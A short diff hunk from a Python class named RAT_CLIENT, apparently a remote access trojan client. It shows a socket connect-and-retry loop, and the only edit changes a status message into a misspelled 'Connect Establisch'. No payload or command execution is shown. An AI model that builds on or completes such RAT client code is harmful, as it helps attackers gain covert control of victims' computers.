@@ -51,7 +51,7 @@ class RAT_CLIENT:
         command = s.recv(1024).decode()
         if command == 'recibido':
             connected = True
-            print("Connect Establish")
+            print("Connect Establisch")
         except socket.error as e:
             print("Attempting to connect...")
             time.sleep(10)
